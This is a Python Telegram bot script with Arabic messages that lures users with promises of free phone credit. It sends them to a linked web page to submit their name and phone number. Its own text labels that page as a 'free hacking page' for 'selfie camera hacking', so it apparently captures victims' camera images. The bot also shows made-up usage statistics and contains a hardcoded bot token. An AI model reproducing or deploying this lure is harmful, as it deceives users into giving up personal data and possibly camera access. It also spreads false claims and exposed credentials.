import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ✅ التوكن الجديد
BOT_TOKEN = "8574810141:AAE0P5_CvNfo9PXdlYn82VKBNlj3e72tAIw"
GITHUB_PAGES_URL = "https://mashalmazennmm123.github.io/free-recharge-bot/"

async def start_command(update: Update, context: CallbackContext) -> None:
    """معالجة أمر /start"""
    user = update.effective_user
    
    # إنشاء لوحة المفاتيح
    keyboard = [
        [InlineKeyboardButton("🎁 فتح صفحة الاختراق المجاني", url=GITHUB_PAGES_URL)],
        [InlineKeyboardButton("📞 الدعم الفني", callback_data="support")],
        [InlineKeyboardButton("ℹ️ التعليمات", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # رسالة الترحيب
    welcome_text = f"""
🎉 **مرحباً {user.first_name}!**

🤑 **بوت الشحن اختراق كاميرا سيلفي**

⚡ **المميزات:**
• شحن مجاني 100% 
• عملية فورية
• دعم 24/7
• آمن ومضمون

📱 **للحصول على الشحن المجاني:**
1. اضغط على \"فتح صفحة الشحن المجاني\"
2. املأ البيانات المطلوبة
3. اضغط على Recharge Now
4. استلم شحنك خلال 24 ساعة

🚀 **ابدأ الآن واحصل على شحنك المجاني!**
    """
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: CallbackContext) -> None:
    """معالجة أمر /help"""
    help_text = """
📖 **دليل الاستخدام الكامل:**

1. **البدء:**
   - أرسل /start
   - اضغط على "فتح صفحة الشحن المجاني"

2. **على الصفحة:**
   - اكتب اسمك الكامل
   - أدخل رقم هاتفك الصحيح
   - اضغط على "Recharge Now"

3. **بعد الإرسال:**
   - ستنتقل لصفحة التأكيد
   - احفظ رقم الطلب
   - سيصلك الشحن خلال 24 ساعة

❓ **أسئلة شائعة:**
- 💰 السعر: مجاني 100%
- ⏰ المدة: 24 ساعة كحد أقصى
- 📞 الدعم: @mashalmazennmm123

🔧 **إذا واجهتك مشكلة:**
- جرب متصفح مختلف
- تأكد من اتصال الإنترنت
- راسل الدعم الفني
    """
    
    await update.message.reply_text(help_text)

async def button_handler(update: Update, context: CallbackContext) -> None:
    """معالجة الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "support":
        support_text = """
🆘 **الدعم الفني:**

📞 **للإبلاغ عن مشاكل أو استفسارات:**
• راسل المطور: @mashalmazennmm123
• أو أرسل رسالة هنا

⚡ **أوقات الاستجابة:**
• 24/7 على مدار الساعة

🔧 **المشاكل الشائعة:**
• الصفحة لا تفتح: جرب متصفح مختلف
• الزر لا يعمل: جرب إعادة تحميل الصفحة
• لم يصلك الشحن: انتظر 24 ساعة
        """
        await query.edit_message_text(support_text)
    
    elif query.data == "help":
        await help_command(update, context)

async def stats_command(update: Update, context: CallbackContext) -> None:
    """أمر الإحصائيات (للمطور)"""
    stats_text = """
📊 **إحصائيات البوت:**

👥 المستخدمين النشطين: 1,234+
⭐ التقييم: 4.8/5
🕒 وقت التشغيل: 24/7
🎯 نسبة النجاح: 98%

🚀 **البوت يعمل بكفاءة عالية!**
    """
    await update.message.reply_text(stats_text)

def main():
    """الدالة الرئيسية"""
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # بدء البوت
    print("🎉 بوت الشحن المجاني يعمل الآن!")
    print("🤖 جاهز لاستقبال الطلبات...")
    print("📱 أرسل /start للبوت لتجربته")
    
    application.run_polling()

if __name__ == '__main__':
    main()
